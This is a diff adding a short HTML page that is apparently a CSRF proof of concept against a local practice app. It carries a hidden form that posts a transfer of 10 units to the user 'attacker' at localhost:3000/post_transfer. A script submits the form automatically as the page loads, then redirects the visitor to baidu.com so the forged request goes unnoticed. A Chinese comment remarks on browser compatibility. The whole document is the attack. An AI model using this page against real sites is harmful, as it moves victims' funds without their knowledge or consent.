@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Document</title>
+</head>
+<body>
+
+    <form action="http://localhost:3000/post_transfer" method="post" enctype="application/x-www-form-urlencoded" id="getpay">
+        <input type="hidden" name="destination_username" value="attacker">
+        <input type="hidden" name="quantity" value=10>
+    </form>
+
+    <script type="text/javascript">
+function autosub(){
+            document.getElementById("getpay").submit();
+        }
+        window.load = autosub();
+        setTimeout(function(){window.location = "http://baidu.com";}, 0.2); //可能由于settimeout的兼容问题，只在chrome支持。某些版本firefox不支持
+        </script>
+</body>
+</html>  
